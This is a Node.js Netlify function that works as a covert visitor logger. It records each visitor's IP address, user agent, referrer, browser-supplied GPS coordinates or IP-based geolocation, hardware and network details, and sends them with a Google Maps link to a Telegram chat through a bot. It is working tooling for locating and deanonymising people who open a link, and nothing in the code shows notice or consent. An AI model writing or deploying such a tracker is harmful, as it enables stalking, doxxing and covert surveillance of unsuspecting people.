// netlify/functions/log.js
const http = require('http');
const https = require('https');

function fetchJson(url, timeout = 2500) {
  return new Promise((resolve) => {
    const req = http.get(url, (res) => {
      let data = '';
      res.on('data', d => data += d);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); } catch (e) { resolve(null); }
      });
    });
    req.on('error', () => resolve(null));
    req.setTimeout(timeout, () => { req.abort(); resolve(null); });
  });
}

exports.handler = async function(event) {
  const headers = event.headers || {};
  let body = {};
  try { body = event.body ? JSON.parse(event.body) : {}; } catch(e){ body = {}; }

  const coords = body.coords || null;
  const client_ip = (body.clientIp && body.clientIp !== '') ? body.clientIp
    : (headers['x-nf-client-connection-ip'] || (headers['x-forwarded-for'] ? headers['x-forwarded-for'].split(',')[0].trim() : '') || 'unknown');

  const ua = headers['user-agent'] || body.userAgent || '-';
  const ref = headers['referer'] || body.referrer || '-';
  const time = new Date().toISOString();

  let text = `New visitor:\nIP: ${client_ip}\nUA: ${ua}\nTime: ${time}\nRef: ${ref}\n`;

  if (coords && coords.lat && coords.lon) {
    text += `Coordinates: ${coords.lat},${coords.lon} (accuracy: ${coords.accuracy || 'n/a'} m)\n`;
    text += `Map: https://www.google.com/maps/search/?api=1&query=${coords.lat},${coords.lon}\n`;
  } else {
    // fallback to IP geolocation
    if (client_ip && client_ip !== 'unknown') {
      const url = `http://ip-api.com/json/${encodeURIComponent(client_ip)}?fields=status,country,regionName,city,lat,lon,isp,org,timezone,proxy,message`;
      const geo = await fetchJson(url);
      if (geo && geo.status === 'success') {
        const loc = `${geo.city || ''} ${geo.regionName || ''} ${geo.country || ''}`.trim();
        text += `Location: ${loc}\nISP: ${geo.isp || ''}\nTimezone: ${geo.timezone || ''}\n`;
        if (geo.lat && geo.lon) text += `Map: https://www.google.com/maps/search/?api=1&query=${geo.lat},${geo.lon}\n`;
      } else if (geo && geo.message) {
        text += `Geo error: ${geo.message}\n`;
      } else {
        text += `Location: unavailable\n`;
      }
    } else {
      text += `Location: unknown\n`;
    }
  }

  if (body.deviceMemory) text += `RAM: ${body.deviceMemory} GB\n`;
  if (body.hardwareConcurrency) text += `CPU cores: ${body.hardwareConcurrency}\n`;
  if (body.timezone) text += `TZ: ${body.timezone}\n`;
  if (body.connection) text += `Network: ${JSON.stringify(body.connection)}\n`;

  // send to Telegram
  if (process.env.TG_BOT_TOKEN && process.env.TG_CHAT_ID) {
    try {
      const payload = JSON.stringify({ chat_id: process.env.TG_CHAT_ID, text });
      const options = {
        hostname: 'api.telegram.org', port: 443,
        path: `/bot${process.env.TG_BOT_TOKEN}/sendMessage`, method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
      };
      await new Promise((resolve) => {
        const req = https.request(options, (res) => {
          res.on('data', ()=>{}); res.on('end', ()=>resolve());
        });
        req.on('error', ()=>resolve());
        req.write(payload);
        req.end();
      });
    } catch(e){}
  }

  return { statusCode: 200, body: 'ok' };
};
